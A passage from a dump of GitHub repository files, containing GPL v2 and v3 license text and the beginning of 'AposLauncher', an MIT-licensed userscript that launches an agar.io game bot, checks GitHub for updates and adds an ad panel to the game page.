are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, the commands you use may be called something other than `show w\' and `show c\'; they could even be mouse-clicks or menu items--whatever suits your program.  You should also get your employer (if you work as a programmer) or your school, if any, to sign a ""copyright disclaimer"" for the program, if necessary.  Here is a sample; alter the names:    Yoyodyne, Inc., hereby disclaims all copyright interest in the program   `Gnomovision\' (which makes passes at compilers) written by James Hacker.    <signature of Ty Coon>, 1 April 1989   Ty Coon, President of Vice  This General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.",,1
0,https://github.com/dulanaDias/login-screen.git,"                    GNU GENERAL PUBLIC LICENSE                        Version 3, 29 June 2007   Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The GNU General Public License is a free, copyleft license for software and other kinds of works.    The licenses for most software and other practical works are designed to take away your freedom to share and change the works.  By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users.  We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors.  You can apply it to your programs, too.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things.    To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights.  Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others.    For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received.  You must make sure that they, too, receive or can get the source code.  And you must show them these terms so they know their rights.    Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you legal permission to copy, distribute and/or modify it.    For the developers\' and authors\' protection, the GPL clearly explains that there is no warranty for this free software.  For both users\' and authors\' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions.    Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so.  This is fundamentally incompatible with the aim of protecting users\' freedom to change the software.  The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable.  Therefore, we have designed this version of the GPL to prohibit the practice for those products.  If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users.    Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary.  To prevent this, the GPL assures that patents cannot be used to render the program non-free.    The precise terms and conditions for copying, distribution and modification follow.                         TERMS AND CONDITIONS    0. Definitions.    ""This License"" refers to version 3 of the GNU General Public License.    ""Copyright"" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks.    ""The Program"" refers to any copyrightable work licensed under this License.  Each licensee is addressed as ""you"".  ""Licensees"" and ""recipients"" may be individuals or organizations.    To ""modify"" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy.  The resulting work is called a ""modified version"" of the earlier work or a work ""based on"" the earlier work.    A ""covered work"" means either the unmodified Program or a work based on the Program.    To ""propagate"" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy.  Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well.    To ""convey"" a work means any kind of propagation that enables other parties to make or receive copies.  Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying.    An interactive user interface displays ""Appropriate Legal Notices"" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License.  If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion.    1. Source Code.    The ""source code"" for a work means the preferred form of the work for making modifications to it.  ""Object code"" means any non-source form of a work.    A ""Standard Interface"" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language.    The ""System Libraries"" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form.  A ""Major Component"", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it.    The ""Corresponding Source"" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities.  However, it does not include the work\'s System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not part of the work.  For example, Corresponding Source includes interface definition files associated with source files for the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work.    The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source.    The Corresponding Source for a work in source code form is that same work.    2. Basic Permissions.    All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met.  This License explicitly affirms your unlimited permission to run the unmodified Program.  The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work.  This License acknowledges your rights of fair use or other equivalent, as provided by copyright law.    You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force.  You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright.  Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you.    Conveying under any other circumstances is permitted solely under the conditions stated below.  Sublicensing is not allowed; section 10 makes it unnecessary.    3. Protecting Users\' Legal Rights From Anti-Circumvention Law.    No covered work shall be deemed part of an effective technological measure under any applicable law fulfilling obligations under article 11 of the WIPO copyright treaty adopted on 20 December 1996, or similar laws prohibiting or restricting circumvention of such measures.    When you convey a covered work, you waive any legal power to forbid circumvention of technological measures to the extent such circumvention is effected by exercising rights under this License with respect to the covered work, and you disclaim any intention to limit operation or modification of the work as a means of enforcing, against the work\'s users, your or third parties\' legal rights to forbid circumvention of technological measures.    4. Conveying Verbatim Copies.    You may convey verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice; keep intact all notices stating that this License and any non-permissive terms added in accord with section 7 apply to the code; keep intact all notices of the absence of any warranty; and give all recipients a copy of this License along with the Program.    You may charge any price or no price for each copy that you convey, and you may offer support or warranty protection for a fee.    5. Conveying Modified Source Versions.    You may convey a work based on the Program, or the modifications to produce it from the Program, in the form of source code under the terms of section 4, provided that you also meet all of these conditions:      a) The work must carry prominent notices stating that you modified     it, and giving a relevant date.      b) The work must carry prominent notices stating that it is     released under this License and any conditions added under section     7.  This requirement modifies the requirement in section 4 to     ""keep intact all notices"".      c) You must license the entire work, as a whole, under this     License to anyone who comes into possession of a copy.  This     License will therefore apply, along with any applicable section 7     additional terms, to the whole of the work, and all its parts,     regardless of how they are packaged.  This License gives no     permission to license the work in any other way, but it does not     invalidate such permission if you have separately received it.      d) If the work has interactive user interfaces, each must display     Appropriate Legal Notices; however, if the Program has interactive     interfaces that do not display Appropriate Legal Notices, your     work need not make them do so.    A compilation of a covered work with other separate and independent works, which are not by their nature extensions of the covered work, and which are not combined with it such as to form a larger program, in or on a volume of a storage or distribution medium, is called an ""aggregate"" if the compilation and its resulting copyright are not used to limit the access or legal rights of the compilation\'s users beyond what the individual works permit.  Inclusion of a covered work in an aggregate does not cause this License to apply to the other parts of the aggregate.    6. Conveying Non-Source Forms.    You may convey a covered work in object code form under the terms of sections 4 and 5, provided that you also convey the machine-readable Corresponding Source under the terms of this License, in one of these ways:      a) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by the     Corresponding Source fixed on a durable physical medium     customarily used for software interchange.      b) Convey the object code in, or embodied in, a physical product     (including a physical distribution medium), accompanied by a     written offer, valid for at least three years and valid for as     long as you offer spare parts or customer support for that product     model, to give anyone who possesses the object code either (1) a     copy of the Corresponding Source for all the software in the     product that is covered by this License, on a durable physical     medium customarily used for software interchange, for a price no     more than your reasonable cost of physically performing this     conveying of source, or (2) access to copy the     Corresponding Source from a network server at no charge.      c) Convey individual copies of the object code with a copy of the     written offer to provide the Corresponding Source.  This     alternative is allowed only occasionally and noncommercially, and     only if you received the object code with such an offer, in accord     with subsection 6b.      d) Convey the object code by offering access from a designated     place (gratis or for a charge), and offer equivalent access to the     Corresponding Source in the same way through the same place at no     further charge.  You need not require recipients to copy the     Corresponding Source along with the object code.  If the place to     copy the object code is a network server, the Corresponding Source     may be on a different server (operated by you or a third party)     that supports equivalent copying facilities, provided you maintain     clear directions next to the object code saying where to find the     Corresponding Source.  Regardless of what server hosts the     Corresponding Source, you remain obligated to ensure that it is     available for as long as needed to satisfy these requirements.      e) Convey the object code using peer-to-peer transmission, provided     you inform other peers where the object code and Corresponding     Source of the work are being offered to the general public at no     charge under subsection 6d.    A separable portion of the object code, whose source code is excluded from the Corresponding Source as a System Library, need not be included in conveying the object code work.    A ""User Product"" is either (1) a ""consumer product"", which means any tangible personal property which is normally used for personal, family, or household purposes, or (2) anything designed or sold for incorporation into a dwelling.  In determining whether a product is a consumer product, doubtful cases shall be resolved in favor of coverage.  For a particular product received by a particular user, ""normally used"" refers to a typical or common use of that class of product, regardless of the status of the particular user or of the way in which the particular user actually uses, or expects or is expected to use, the product.  A product is a consumer product regardless of whether the product has substantial commercial, industrial or non-consumer uses, unless such uses represent the only significant mode of use of the product.    ""Installation Information"" for a User Product means any methods, procedures, authorization keys, or other information required to install and execute modified versions of a covered work in that User Product from a modified version of its Corresponding Source.  The information must suffice to ensure that the continued functioning of the modified object code is in no case prevented or interfered with solely because modification has been made.    If you convey an object code work under this section in, or with, or specifically for use in, a User Product, and the conveying occurs as part of a transaction in which the right of possession and use of the User Product is transferred to the recipient in perpetuity or for a fixed term (regardless of how the transaction is characterized), the Corresponding Source conveyed under this section must be accompanied by the Installation Information.  But this requirement does not apply if neither you nor any third party retains the ability to install modified object code on the User Product (for example, the work has been installed in ROM).    The requirement to provide Installation Information does not include a requirement to continue to provide support service, warranty, or updates for a work that has been modified or installed by the recipient, or for the User Product in which it has been modified or installed.  Access to a network may be denied when the modification itself materially and adversely affects the operation of the network or violates the rules and protocols for communication across the network.    Corresponding Source conveyed, and Installation Information provided, in accord with this section must be in a format that is publicly documented (and with an implementation available to the public in source code form), and must require no special password or key for unpacking, reading or copying.    7. Additional Terms.    ""Additional permissions"" are terms that supplement the terms of this License by making exceptions from one or more of its conditions. Additional permissions that are applicable to the entire Program shall be treated as though they were included in this License, to the extent that they are valid under applicable law.  If additional permissions apply only to part of the Program, that part may be used separately under those permissions, but the entire Program remains governed by this License without regard to the additional permissions.    When you convey a copy of a covered work, you may at your option remove any additional permissions from that copy, or from any part of it.  (Additional permissions may be written to require their own removal in certain cases when you modify the work.)  You may place additional permissions on material, added by you to a covered work, for which you have or can give appropriate copyright permission.    Notwithstanding any other provision of this License, for material you add to a covered work, you may (if authorized by the copyright holders of that material) supplement the terms of this License with terms:      a) Disclaiming warranty or limiting liability differently from the     terms of sections 15 and 16 of this License; or      b) Requiring preservation of specified reasonable legal notices or     author attributions in that material or in the Appropriate Legal     Notices displayed by works containing it; or      c) Prohibiting misrepresentation of the origin of that material, or     requiring that modified versions of such material be marked in     reasonable ways as different from the original version; or      d) Limiting the use for publicity purposes of names of licensors or     authors of the material; or      e) Declining to grant rights under trademark law for use of some     trade names, trademarks, or service marks; or      f) Requiring indemnification of licensors and authors of that     material by anyone who conveys the material (or modified versions of     it) with contractual assumptions of liability to the recipient, for     any liability that these contractual assumptions directly impose on     those licensors and authors.    All other non-permissive additional terms are considered ""further restrictions"" within the meaning of section 10.  If the Program as you received it, or any part of it, contains a notice stating that it is governed by this License along with a term that is a further restriction, you may remove that term.  If a license document contains a further restriction but permits relicensing or conveying under this License, you may add to a covered work material governed by the terms of that license document, provided that the further restriction does not survive such relicensing or conveying.    If you add terms to a covered work in accord with this section, you must place, in the relevant source files, a statement of the additional terms that apply to those files, or a notice indicating where to find the applicable terms.    Additional terms, permissive or non-permissive, may be stated in the form of a separately written license, or stated as exceptions; the above requirements apply either way.    8. Termination.    You may not propagate or modify a covered work except as expressly provided under this License.  Any attempt otherwise to propagate or modify it is void, and will automatically terminate your rights under this License (including any patent licenses granted under the third paragraph of section 11).    However, if you cease all violation of this License, then your license from a particular copyright holder is reinstated (a) provisionally, unless and until the copyright holder explicitly and finally terminates your license, and (b) permanently, if the copyright holder fails to notify you of the violation by some reasonable means prior to 60 days after the cessation.    Moreover, your license from a particular copyright holder is reinstated permanently if the copyright holder notifies you of the violation by some reasonable means, this is the first time you have received notice of violation of this License (for any work) from that copyright holder, and you cure the violation prior to 30 days after your receipt of the notice.    Termination of your rights under this section does not terminate the licenses of parties who have received copies or rights from you under this License.  If your rights have been terminated and not permanently reinstated, you do not qualify to receive new licenses for the same material under section 10.    9. Acceptance Not Required for Having Copies.    You are not required to accept this License in order to receive or run a copy of the Program.  Ancillary propagation of a covered work occurring solely as a consequence of using peer-to-peer transmission to receive a copy likewise does not require acceptance.  However, nothing other than this License grants you permission to propagate or modify any covered work.  These actions infringe copyright if you do not accept this License.  Therefore, by modifying or propagating a covered work, you indicate your acceptance of this License to do so.    10. Automatic Licensing of Downstream Recipients.    Each time you convey a covered work, the recipient automatically receives a license from the original licensors, to run, modify and propagate that work, subject to this License.  You are not responsible for enforcing compliance by third parties with this License.    An ""entity transaction"" is a transaction transferring control of an organization, or substantially all assets of one, or subdividing an organization, or merging organizations.  If propagation of a covered work results from an entity transaction, each party to that transaction who receives a copy of the work also receives whatever licenses to the work the party\'s predecessor in interest had or could give under the previous paragraph, plus a right to possession of the Corresponding Source of the work from the predecessor in interest, if the predecessor has it or can get it with reasonable efforts.    You may not impose any further restrictions on the exercise of the rights granted or affirmed under this License.  For example, you may not impose a license fee, royalty, or other charge for exercise of rights granted under this License, and you may not initiate litigation (including a cross-claim or counterclaim in a lawsuit) alleging that any patent claim is infringed by making, using, selling, offering for sale, or importing the Program or any portion of it.    11. Patents.    A ""contributor"" is a copyright holder who authorizes use under this License of the Program or a work on which the Program is based.  The work thus licensed is called the contributor\'s ""contributor version"".    A contributor\'s ""essential patent claims"" are all patent claims owned or controlled by the contributor, whether already acquired or hereafter acquired, that would be infringed by some manner, permitted by this License, of making, using, or selling its contributor version, but do not include claims that would be infringed only as a consequence of further modification of the contributor version.  For purposes of this definition, ""control"" includes the right to grant patent sublicenses in a manner consistent with the requirements of this License.    Each contributor grants you a non-exclusive, worldwide, royalty-free patent license under the contributor\'s essential patent claims, to make, use, sell, offer for sale, import and otherwise run, modify and propagate the contents of its contributor version.    In the following three paragraphs, a ""patent license"" is any express agreement or commitment, however denominated, not to enforce a patent (such as an express permission to practice a patent or covenant not to sue for patent infringement).  To ""grant"" such a patent license to a party means to make such an agreement or commitment not to enforce a patent against the party.    If you convey a covered work, knowingly relying on a patent license, and the Corresponding Source of the work is not available for anyone to copy, free of charge and under the terms of this License, through a publicly available network server or other readily accessible means, then you must either (1) cause the Corresponding Source to be so available, or (2) arrange to deprive yourself of the benefit of the patent license for this particular work, or (3) arrange, in a manner consistent with the requirements of this License, to extend the patent license to downstream recipients.  ""Knowingly relying"" means you have actual knowledge that, but for the patent license, your conveying the covered work in a country, or your recipient\'s use of the covered work in a country, would infringe one or more identifiable patents in that country that you have reason to believe are valid.    If, pursuant to or in connection with a single transaction or arrangement, you convey, or propagate by procuring conveyance of, a covered work, and grant a patent license to some of the parties receiving the covered work authorizing them to use, propagate, modify or convey a specific copy of the covered work, then the patent license you grant is automatically extended to all recipients of the covered work and works based on it.    A patent license is ""discriminatory"" if it does not include within the scope of its coverage, prohibits the exercise of, or is conditioned on the non-exercise of one or more of the rights that are specifically granted under this License.  You may not convey a covered work if you are a party to an arrangement with a third party that is in the business of distributing software, under which you make payment to the third party based on the extent of your activity of conveying the work, and under which the third party grants, to any of the parties who would receive the covered work from you, a discriminatory patent license (a) in connection with copies of the covered work conveyed by you (or copies made from those copies), or (b) primarily for and in connection with specific products or compilations that contain the covered work, unless you entered into that arrangement, or that patent license was granted, prior to 28 March 2007.    Nothing in this License shall be construed as excluding or limiting any implied license or other defenses to infringement that may otherwise be available to you under applicable patent law.    12. No Surrender of Others\' Freedom.    If conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot convey a covered work so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not convey it at all.  For example, if you agree to terms that obligate you to collect a royalty for further conveying from those to whom you convey the Program, the only way you could satisfy both those terms and this License would be to refrain entirely from conveying the Program.    13. Use with the GNU Affero General Public License.    Notwithstanding any other provision of this License, you have permission to link or combine any covered work with a work licensed under version 3 of the GNU Affero General Public License into a single combined work, and to convey the resulting work.  The terms of this License will continue to apply to the part which is the covered work, but the special requirements of the GNU Affero General Public License, section 13, concerning interaction through a network will apply to the combination as such.    14. Revised Versions of this License.    The Free Software Foundation may publish revised and/or new versions of the GNU General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.    Each version is given a distinguishing version number.  If the Program specifies that a certain numbered version of the GNU General Public License ""or any later version"" applies to it, you have the option of following the terms and conditions either of that numbered version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of the GNU General Public License, you may choose any version ever published by the Free Software Foundation.    If the Program specifies that a proxy can decide which future versions of the GNU General Public License can be used, that proxy\'s public statement of acceptance of a version permanently authorizes you to choose that version for the Program.    Later license versions may give you additional or different permissions.  However, no additional obligations are imposed on any author or copyright holder as a result of your choosing to follow a later version.    15. Disclaimer of Warranty.    THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    16. Limitation of Liability.    IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.    17. Interpretation of Sections 15 and 16.    If the disclaimer of warranty and limitation of liability provided above cannot be given local legal effect according to their terms, reviewing courts shall apply local law that most closely approximates an absolute waiver of all civil liability in connection with the Program, unless a warranty or assumption of liability accompanies a copy of the Program in return for a fee.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License     along with this program.  If not, see <https://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:      <program>  Copyright (C) <year>  <name of author>     This program comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, your program\'s commands might be different; for a GUI interface, you would use an ""about box"".    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <https://www.gnu.org/licenses/>.    The GNU General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.  But first, please read <https://www.gnu.org/licenses/why-not-lgpl.html>.",,1
0,https://github.com/mochtamvan/launcher.user.js.git,"/*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/ // ==UserScript== // @name        AposLauncher // @namespace   AposLauncher // @include     http://agar.io/* // @version     4.148 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript== var aposLauncherVersion = 4.148;  var showAd = true;  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b"";  function getLatestCommit() {     window.jQuery.ajax({         url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",         cache: false,         dataType: ""jsonp""     }).done(function(data) {         console.dir(data.data);         console.log(""hmm: "" + data.data.object.sha);         sha = data.data.object.sha;          function update(prefix, name, url) {             window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");             window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");             window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");             window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");             window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                 window.jQuery(""#"" + prefix + ""Dialog"").hide();                 window.jQuery(""#"" + prefix + ""Dialog"").remove();             });             window.jQuery(""#"" + prefix + ""Dialog"").show();         }          window.jQuery.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/launcher.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {             var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm, """");             latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"") + 11, latestVersion.indexOf(""// @grant""));              latestVersion = parseFloat(latestVersion + 0.0000);             var myVersion = parseFloat(aposLauncherVersion + 0.0000);              if (latestVersion > myVersion) {                 update(""aposLauncher"", ""launcher.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/launcher.user.js/"");             }             console.log(\'Current launcher.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);         });      }).fail(function() {}); } getLatestCommit();  function addAd() {     window.google_ad_client = ""ca-pub-5878021809689194"";     window.google_ad_slot = ""1479874665"";     window.google_ad_width = 300;     window.google_ad_height = 250;      window.jQuery("".side-container:last"").append(""<div class=\'agario-panel\'><center id=\'aposAd\'></center></div>"");     var aposAd = document.getElementById(\'aposAd\');     var w = document.write;     document.write = function (content) {         aposAd.innerHTML = content;         document.write = w;     };      var script = document.createElement(\'script\');     script.type = \'text/javascript\';     script.src = \'http://pagead2.googlesyndication.com/pagead/show_ads.js\';     document.body.appendChild(script); }  if (showAd) {     addAd(); }  console.log(""Running Bot Launcher!""); (function(d, e) {      //UPDATE     function keyAction(e) {         if (84 == e.keyCode) {             console.log(""Toggle"");             toggle = !toggle;         }         if (82 == e.keyCode) {             console.log(""ToggleDraw"");             toggleDraw = !toggleDraw;         }         if (68 == e.keyCode) {             window.setDarkTheme(!getDarkBool());         }         if (70 == e.keyCode) {             window.setShowMass(!getMassBool());         }         if (69 == e.keyCode) {             if (message.length > 0) {                 window.setMessage([]);                 window.onmouseup = function() {};                 window.ignoreStream = true;             } else {                 window.ignoreStream = false;                 window.refreshTwitch();             }         }         window.botList[botIndex].keyAction(e);     }      function humanPlayer() {         //Don\'t need to do anything.         return [getPointX(), getPointY()];     }        function pb() {          //UPDATE          window.botList = window.botList || [];          window.jQuery(\'#nick\').val(originalName);          function HumanPlayerObject() {             this.name = ""Human"";             this.keyAction = function(key) {};             this.displayText = function() {                 return [];             };             this.mainLoop = humanPlayer;         }          var hpo = new HumanPlayerObject();          window.botList.push(hpo);          window.updateBotList();          ya = !0;         Pa();         setInterval(Pa, 18E4);          var father = window.jQuery(""#canvas"").parent();         window.jQuery(""#canvas"").remove();         father.prepend(""<canvas id=\'canvas\'>"");          G = za = document.getElementById(""canvas"");         f = G.getContext(""2d"");         G.onmousedown = function(a) {             if (Qa) {                 var b = a.clientX - (5 + m / 5 / 2),                     c = a.clientY - (5 + m / 5 / 2);                 if (Math.sqrt(b * b + c * c) <= m / 5 / 2) {                     V();                     H(17);                     return                 }             }             fa = a.clientX;             ga = a.clientY;             Aa();             V();         };         G.onmousemove = function(a) {             fa = a.clientX;             ga = a.clientY;             Aa();         };         G.onmouseup = function() {};         /firefox/i.test(navigator.userAgent) ? document.addEventListener(""DOMMouseScroll"", Ra, !1) : document.body.onmousewheel = Ra;         var a = !1,             b = !1,             c = !1;         d.onkeydown = function(l) {             //UPDATE             if (!window.jQuery(\'#nick\').is("":focus"")) {                 32 != l.keyCode || a || (V(), H(17), a = !0);                 81 != l.keyCode || b || (H(18), b = !0);                 87 != l.keyCode || c || (V(), H(21), c = !0);                 27 == l.keyCode && Sa(!0);                  //UPDATE                 keyAction(l);             }         };         d.onkeyup = function(l) {             32 == l.keyCode && (a = !1);             87 == l.keyCode && (c = !1);             81 == l.keyCode && b && (H(19), b = !1);         };         d.onblur = function() {             H(19);             c = b = a = !1         };         d.onresize = Ta;         d.requestAnimationFrame(Ua);         setInterval(V, 40);         y && e(""#region"").val(y);         Va();         ha(e(""#region"").val());         0 == Ba && y && I();         W = !0;         e(""#overlays"").show();         Ta();         d.location.hash && 6 <= d.location.hash.length && Wa(d.location.hash)     }      function Ra(a) {         J *= Math.pow(.9, a.wheelDelta / -120 || a.detail || 0);         console.log(""J: "" + J);         //UPDATE         0.07 > J && (J = 0.07);         J > 4 / h && (J = 4 / h)     }      function qb() {         if (.4 > h) X = null;         else {             for (var a = Number.POSITIVE_INFINITY, b = Number.POSITIVE_INFINITY, c = Number.NEGATIVE_INFINITY, l = Number.NEGATIVE_INFINITY, d = 0, p = 0; p < v.length; p++) {                 var g = v[p];                 !g.N() || g.R || 20 >= g.size * h || (d = Math.max(g.size, d), a = Math.min(g.x, a), b = Math.min(g.y, b), c = Math.max(g.x, c), l = Math.max(g.y, l))             }             X = rb.ka({                 ca: a - 10,                 da: b - 10,                 oa: c + 10,                 pa: l + 10,                 ma: 2,                 na: 4             });             for (p = 0; p < v.length; p++)                 if (g = v[p],                     g.N() && !(20 >= g.size * h))                     for (a = 0; a < g.a.length; ++a) b = g.a[a].x, c = g.a[a].y, b < s - m / 2 / h || c < t - r / 2 / h || b > s + m / 2 / h || c > t + r / 2 / h || X.m(g.a[a])         }     }      function Aa() {         //UPDATE         if (toggle || window.botList[botIndex].name == ""Human"") {             setPoint(((fa - m / 2) / h + s), ((ga - r / 2) / h + t));         }     }      function Pa() {         null == ka && (ka = {}, e(""#region"").children().each(function() {             var a = e(this),                 b = a.val();             b && (ka[b] = a.text())         }));         e.get(ap + ""info"", function(a) {                 var b = {},                     c;                 for (c in a.regions) {                     var l = c.split("":"")[0];                     b[l] = b[l] || 0;                     b[l] += a.regions[c].numPlayers                 }                 for (c in b) e(\'#region option[value=""\' + c + \'""]\').text(ka[c] + "" ("" + b[c] + "" players)"")             },             ""json"")     }      function Xa() {         